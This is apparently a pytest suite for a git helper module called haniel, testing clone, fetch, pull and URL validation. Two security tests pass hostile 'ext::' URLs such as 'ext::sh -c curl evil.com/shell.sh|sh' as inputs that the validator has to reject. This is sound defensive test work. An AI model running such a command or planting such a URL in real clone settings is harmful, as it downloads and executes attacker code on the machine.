"""
Tests for haniel git module.

Uses real git operations against local test repositories.
"""

import subprocess
from pathlib import Path

import pytest

from haniel.core.git import (
    GitError,
    GitCloneError,
    GitFetchError,
    GitPullError,
    GitTimeoutError,
    get_head,
    get_remote_head,
    clone_repo,
    fetch_repo,
    pull_repo,
    has_changes,
    _validate_git_url,
)


@pytest.fixture
def git_repo(tmp_path: Path) -> Path:
    """Create a local git repository for testing."""
    repo_path = tmp_path / "test-repo"
    repo_path.mkdir()

    # Initialize git repo
    subprocess.run(["git", "init"], cwd=repo_path, check=True, capture_output=True)
    subprocess.run(
        ["git", "config", "user.email", "test@example.com"],
        cwd=repo_path,
        check=True,
        capture_output=True,
    )
    subprocess.run(
        ["git", "config", "user.name", "Test User"],
        cwd=repo_path,
        check=True,
        capture_output=True,
    )

    # Create initial commit
    (repo_path / "README.md").write_text("# Test Repo\n")
    subprocess.run(["git", "add", "."], cwd=repo_path, check=True, capture_output=True)
    subprocess.run(
        ["git", "commit", "-m", "Initial commit"],
        cwd=repo_path,
        check=True,
        capture_output=True,
    )

    return repo_path


@pytest.fixture
def bare_remote(tmp_path: Path, git_repo: Path) -> Path:
    """Create a bare remote repository from git_repo."""
    bare_path = tmp_path / "remote.git"
    subprocess.run(
        ["git", "clone", "--bare", str(git_repo), str(bare_path)],
        check=True,
        capture_output=True,
    )

    # Add the bare repo as remote to the original
    subprocess.run(
        ["git", "remote", "add", "origin", str(bare_path)],
        cwd=git_repo,
        check=True,
        capture_output=True,
    )

    return bare_path


class TestGetHead:
    """Tests for get_head function."""

    def test_returns_commit_hash(self, git_repo: Path):
        """Should return a valid 40-character commit hash."""
        head = get_head(git_repo)

        assert len(head) == 40
        assert all(c in "0123456789abcdef" for c in head)

    def test_raises_for_non_git_directory(self, tmp_path: Path):
        """Should raise GitError for non-git directories."""
        with pytest.raises(GitError):
            get_head(tmp_path)

    def test_raises_for_nonexistent_path(self, tmp_path: Path):
        """Should raise GitError for nonexistent paths."""
        with pytest.raises(GitError):
            get_head(tmp_path / "nonexistent")


class TestGetRemoteHead:
    """Tests for get_remote_head function."""

    def test_returns_remote_commit_hash(self, git_repo: Path, bare_remote: Path):
        """Should return the remote branch's HEAD commit hash."""
        # First fetch to make sure remote refs exist
        subprocess.run(
            ["git", "fetch", "origin"], cwd=git_repo, check=True, capture_output=True
        )

        remote_head = get_remote_head(git_repo, "master")
        local_head = get_head(git_repo)

        # Initially should be the same
        assert remote_head == local_head

    def test_raises_for_no_remote(self, git_repo: Path):
        """Should raise GitError if no remote is configured."""
        with pytest.raises(GitError):
            get_remote_head(git_repo, "master")

    def test_raises_for_nonexistent_path(self, tmp_path: Path):
        """Should raise GitError for nonexistent paths."""
        with pytest.raises(GitError):
            get_remote_head(tmp_path / "nonexistent", "master")


class TestCloneRepo:
    """Tests for clone_repo function."""

    def test_clones_repository(self, bare_remote: Path, tmp_path: Path):
        """Should clone a repository to the specified path."""
        clone_path = tmp_path / "cloned-repo"

        clone_repo(str(bare_remote), "master", clone_path)

        assert clone_path.exists()
        assert (clone_path / ".git").is_dir()
        assert (clone_path / "README.md").exists()

    def test_clones_specific_branch(
        self, git_repo: Path, bare_remote: Path, tmp_path: Path
    ):
        """Should clone a specific branch."""
        # Create a new branch in the repo and push to bare
        subprocess.run(
            ["git", "checkout", "-b", "feature"],
            cwd=git_repo,
            check=True,
            capture_output=True,
        )
        (git_repo / "feature.txt").write_text("feature content")
        subprocess.run(
            ["git", "add", "."], cwd=git_repo, check=True, capture_output=True
        )
        subprocess.run(
            ["git", "commit", "-m", "Add feature"],
            cwd=git_repo,
            check=True,
            capture_output=True,
        )
        subprocess.run(
            ["git", "push", "origin", "feature"],
            cwd=git_repo,
            check=True,
            capture_output=True,
        )

        # Clone the feature branch
        clone_path = tmp_path / "feature-clone"
        clone_repo(str(bare_remote), "feature", clone_path)

        assert (clone_path / "feature.txt").exists()

    def test_raises_for_invalid_url(self, tmp_path: Path):
        """Should raise GitCloneError for invalid URLs."""
        clone_path = tmp_path / "bad-clone"

        with pytest.raises(GitCloneError) as exc_info:
            clone_repo("git@invalid.example:nonexistent/repo.git", "main", clone_path)

        assert "clone" in str(exc_info.value).lower()

    def test_raises_if_path_exists(self, bare_remote: Path, tmp_path: Path):
        """Should raise GitCloneError if destination path already exists."""
        clone_path = tmp_path / "existing"
        clone_path.mkdir()

        with pytest.raises(GitCloneError):
            clone_repo(str(bare_remote), "master", clone_path)

    def test_raises_for_ext_protocol_url(self, tmp_path: Path):
        """Should raise ValueError for ext:: protocol URLs (security)."""
        clone_path = tmp_path / "malicious-clone"

        with pytest.raises(ValueError) as exc_info:
            clone_repo("ext::sh -c curl evil.com/shell.sh|sh", "main", clone_path)

        assert "Unsupported git protocol" in str(exc_info.value)

    def test_raises_for_url_with_embedded_credentials(self, tmp_path: Path):
        """Should raise ValueError for URLs with embedded credentials (security)."""
        clone_path = tmp_path / "creds-clone"

        with pytest.raises(ValueError) as exc_info:
            clone_repo(
                "https://user:password@github.com/org/repo.git", "main", clone_path
            )

        assert "embedded credentials" in str(exc_info.value)


class TestFetchRepo:
    """Tests for fetch_repo function."""

    def test_fetches_updates(self, git_repo: Path, bare_remote: Path, tmp_path: Path):
        """Should fetch updates from remote."""
        # Clone the repo
        clone_path = tmp_path / "clone"
        clone_repo(str(bare_remote), "master", clone_path)

        # Make a new commit in the original repo and push
        (git_repo / "new-file.txt").write_text("new content")
        subprocess.run(
            ["git", "add", "."], cwd=git_repo, check=True, capture_output=True
        )
        subprocess.run(
            ["git", "commit", "-m", "Add new file"],
            cwd=git_repo,
            check=True,
            capture_output=True,
        )
        subprocess.run(
            ["git", "push", "origin", "master"],
            cwd=git_repo,
            check=True,
            capture_output=True,
        )

        # Fetch in the clone
        has_updates = fetch_repo(clone_path, "master")

        assert has_updates is True

    def test_returns_false_when_no_changes(
        self, git_repo: Path, bare_remote: Path, tmp_path: Path
    ):
        """Should return False when there are no new commits."""
        # Clone the repo
        clone_path = tmp_path / "clone"
        clone_repo(str(bare_remote), "master", clone_path)

        # Fetch without any new commits
        has_updates = fetch_repo(clone_path, "master")

        assert has_updates is False

    def test_raises_for_non_git_directory(self, tmp_path: Path):
        """Should raise GitFetchError for non-git directories."""
        with pytest.raises(GitFetchError):
            fetch_repo(tmp_path, "master")


class TestPullRepo:
    """Tests for pull_repo function."""

    def test_pulls_updates(self, git_repo: Path, bare_remote: Path, tmp_path: Path):
        """Should pull updates and update working tree."""
        # Clone the repo
        clone_path = tmp_path / "clone"
        clone_repo(str(bare_remote), "master", clone_path)

        # Make a new commit in the original repo and push
        (git_repo / "pulled-file.txt").write_text("pulled content")
        subprocess.run(
            ["git", "add", "."], cwd=git_repo, check=True, capture_output=True
        )
        subprocess.run(
            ["git", "commit", "-m", "Add pulled file"],
            cwd=git_repo,
            check=True,
            capture_output=True,
        )
        subprocess.run(
            ["git", "push", "origin", "master"],
            cwd=git_repo,
            check=True,
            capture_output=True,
        )

        # Pull in the clone
        pull_repo(clone_path, "master")

        assert (clone_path / "pulled-file.txt").exists()
        assert (clone_path / "pulled-file.txt").read_text() == "pulled content"

    def test_raises_for_non_git_directory(self, tmp_path: Path):
        """Should raise GitPullError for non-git directories."""
        with pytest.raises(GitPullError):
            pull_repo(tmp_path, "master")

    def test_force_pull_discards_local_changes(
        self, git_repo: Path, bare_remote: Path
    ):
        """Force strategy should discard local tracked changes and return their list."""
        readme = git_repo / "README.md"
        original_content = readme.read_text()
        readme.write_text("locally modified content")

        discarded = pull_repo(git_repo, "master", strategy="force")

        assert any("README.md" in entry for entry in discarded)
        assert readme.read_text() == original_content

    def test_force_pull_returns_empty_when_clean(
        self, git_repo: Path, bare_remote: Path
    ):
        """Force strategy should return empty list when there are no local changes."""
        discarded = pull_repo(git_repo, "master", strategy="force")

        assert discarded == []

    def test_force_pull_raises_on_invalid_path(self):
        """Force strategy should raise GitPullError for non-existent path."""
        with pytest.raises(GitPullError):
            pull_repo(Path("/nonexistent"), "master", strategy="force")


class TestHasChanges:
    """Tests for has_changes function."""

    def test_detects_changes(self, git_repo: Path, bare_remote: Path, tmp_path: Path):
        """Should return True when remote has new commits."""
        # Clone the repo
        clone_path = tmp_path / "clone"
        clone_repo(str(bare_remote), "master", clone_path)

        # Make a new commit in the original repo and push
        (git_repo / "change.txt").write_text("change")
        subprocess.run(
            ["git", "add", "."], cwd=git_repo, check=True, capture_output=True
        )
        subprocess.run(
            ["git", "commit", "-m", "Add change"],
            cwd=git_repo,
            check=True,
            capture_output=True,
        )
        subprocess.run(
            ["git", "push", "origin", "master"],
            cwd=git_repo,
            check=True,
            capture_output=True,
        )

        # Fetch first to get remote refs
        fetch_repo(clone_path, "master")

        # Check for changes
        result = has_changes(clone_path, "master")

        assert result is True

    def test_no_changes_when_up_to_date(
        self, git_repo: Path, bare_remote: Path, tmp_path: Path
    ):
        """Should return False when local matches remote."""
        # Clone the repo
        clone_path = tmp_path / "clone"
        clone_repo(str(bare_remote), "master", clone_path)

        # Check for changes (none expected)
        # Need to fetch first to have remote refs
        subprocess.run(
            ["git", "fetch", "origin"], cwd=clone_path, check=True, capture_output=True
        )

        result = has_changes(clone_path, "master")

        assert result is False


class TestGitErrorClasses:
    """Tests for Git error classes."""

    def test_git_error_inheritance(self):
        """All Git errors should inherit from GitError."""
        assert issubclass(GitCloneError, GitError)
        assert issubclass(GitFetchError, GitError)
        assert issubclass(GitPullError, GitError)
        assert issubclass(GitTimeoutError, GitError)

    def test_git_error_message(self):
        """GitError should store error message."""
        error = GitError("test error")
        assert str(error) == "test error"

    def test_git_error_with_details(self):
        """GitError subclasses should include detailed information."""
        error = GitCloneError(
            "Failed to clone",
            url="git@example.com:repo.git",
            stderr="Permission denied",
        )
        error_str = str(error)
        assert "Failed to clone" in error_str

    def test_git_fetch_error_str(self):
        """GitFetchError should include path and stderr in string."""
        from pathlib import Path

        error = GitFetchError(
            "Failed to fetch", path=Path("/tmp/repo"), stderr="Network unreachable"
        )
        error_str = str(error)
        assert "Failed to fetch" in error_str
        assert str(Path("/tmp/repo")) in error_str
        assert "Network unreachable" in error_str

    def test_git_pull_error_str(self):
        """GitPullError should include path and stderr in string."""
        from pathlib import Path

        error = GitPullError(
            "Failed to pull", path=Path("/tmp/repo"), stderr="Merge conflict"
        )
        error_str = str(error)
        assert "Failed to pull" in error_str
        assert str(Path("/tmp/repo")) in error_str
        assert "Merge conflict" in error_str

    def test_git_timeout_error(self):
        """GitTimeoutError should include timeout value."""
        error = GitTimeoutError("Operation timed out", timeout=300)
        assert error.timeout == 300


class TestValidateGitUrl:
    """Tests for URL validation."""

    def test_allows_ssh_url(self):
        """Should allow standard SSH URLs."""
        _validate_git_url("git@github.com:org/repo.git")

    def test_allows_https_url(self):
        """Should allow HTTPS URLs without credentials."""
        _validate_git_url("https://github.com/org/repo.git")

    def test_rejects_ext_protocol(self):
        """Should reject ext:: protocol."""
        with pytest.raises(ValueError):
            _validate_git_url("ext::sh -c 'curl evil.com'")

    def test_rejects_embedded_credentials(self):
        """Should reject URLs with embedded user:pass."""
        with pytest.raises(ValueError):
            _validate_git_url("https://user:password@github.com/org/repo.git")

    def test_allows_ssh_without_port(self):
        """Should allow SSH URLs without embedded credentials."""
        _validate_git_url("ssh://git@github.com/org/repo.git")
